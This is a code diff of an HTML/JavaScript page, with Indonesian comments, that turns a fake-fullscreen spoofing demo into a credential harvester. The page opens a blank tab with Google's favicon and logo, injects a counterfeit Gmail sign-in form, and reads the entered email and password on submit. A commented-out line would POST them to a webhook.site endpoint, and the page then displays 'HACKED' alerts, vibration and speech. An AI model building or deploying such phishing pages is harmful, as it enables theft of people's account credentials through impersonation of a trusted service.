@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Auto Fullscreen Spoofing</title>
+<title>Credential Harvester + TTS + Vibration</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -19,8 +19,8 @@ button:disabled { background: #555; cursor: not-allowed; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ AUTO FULLSCREEN SPOOFING</h1>
-    <p>Memicu tab baru dengan layar penuh (Fullscreen) tanpa Address Bar palsu.</p>
+    <h1>⚠️ HARVESTER SPOOFING</h1>
+    <p>Memicu tab baru dengan form login. Saat diisi dan di-submit, akan muncul efek Hacked.</p>
     
     <button id="start-btn" type="button">Mulai Spoofing</button>
     
@@ -52,9 +52,7 @@ startBtn.addEventListener("click", function() {
     startBtn.disabled = true;
     startBtn.textContent = "Memproses...";
 
-    efekHacker();
-
-    statusDiv.textContent = "Memicu Auto Fullscreen Spoofing...";
+    statusDiv.textContent = "Membuka tab spoofing...";
 
     // Buka tab kosong secara instan
     const w = window.open('about:blank', '_blank');
@@ -74,7 +72,7 @@ startBtn.addEventListener("click", function() {
         link.href = 'https://www.google.com/favicon.ico';
         w.document.head.appendChild(link);
 
-        // 2. SUNTIKKAN KONTEN LOGIN PALSU (TANPA FAKE ADDRESS BAR)
+        // 2. SUNTIKKAN FAKE LOGIN + LOGIKA PENANGKAPAN
         w.document.body.style.margin = "0";
         w.document.body.style.padding = "0";
         w.document.body.style.background = "#fff";
@@ -86,31 +84,45 @@ startBtn.addEventListener("click", function() {
                     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
                     <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
                     <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
-                    <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                    <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                    <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
-                    <p style="color:#f00; font-size:10px; margin-top:20px;">Auto Fullscreen by Waguri</p>
+                    
+                    <!-- FORM LOGIN -->
+                    <form id="fakeLoginForm">
+                        <input type="email" id="emailInput" placeholder="Email or phone" required style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                        <input type="password" id="passInput" placeholder="Password" required style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                        <button type="submit" style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
+                    </form>
+                    
+                    <p style="color:#f00; font-size:10px; margin-top:20px;">Spoofed by Waguri</p>
                 </div>
             </div>
         `;
 
-        // 3. AUTO FULLSCREEN DI TAB BARU
-        try {
-            if (w.document.documentElement.requestFullscreen) {
-                w.document.documentElement.requestFullscreen().catch(function(e) {
-                    // Fullscreen mungkin diblokir jika tidak ada gesture di tab baru
-                    console.log("Fullscreen diblokir:", e);
-                });
-            }
-        } catch(e) {}
+        // 3. LOGIKA PENANGKAPAN SAAT FORM DI-SUBMIT
+        w.document.getElementById('fakeLoginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Mencegah halaman reload
 
-        // 4. GETAR & TTS DI TAB BARU
-        w.eval(`
-            if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }
-            if ('speechSynthesis' in window) { setInterval(function() { var msg = new SpeechSynthesisUtterance('System compromised'); msg.lang = 'en-US'; window.speechSynthesis.speak(msg); }, 3000); }
-        `);
+            var email = w.document.getElementById('emailInput').value;
+            var pass = w.document.getElementById('passInput').value;
 
-        statusDiv.textContent = "Berhasil! Tab baru telah dibuka dengan Auto Fullscreen.";
+            // Kirim data ke webhook/server Anda (Opsional)
+            // fetch('https://webhook.site/...', { method: 'POST', body: JSON.stringify({email: email, pass: pass}) });
+
+            // Tampilkan efek Hacked
+            efekHacker(); // TTS & Getar di halaman utama
+            alert('HACKED BY WAGURI\\n\\nKredensial Anda telah dicuri!\\nEmail: ' + email + '\\nPassword: ' + pass);
+            
+            // Trigger efek di tab baru juga (karena tab baru mungkin tidak fokus)
+            try {
+                if (w.navigator.vibrate) w.navigator.vibrate([1000, 200, 1000, 200, 1000]);
+                if ('speechSynthesis' in w) {
+                    var msg = new w.SpeechSynthesisUtterance('Hacked by Waguri');
+                    msg.lang = 'en-US';
+                    w.speechSynthesis.speak(msg);
+                }
+            } catch(e) {}
+        });
+
+        statusDiv.textContent = "Berhasil! Form Login Palsu siap diuji.";
         statusDiv.style.color = '#4CAF50';
 
     } catch(e) {
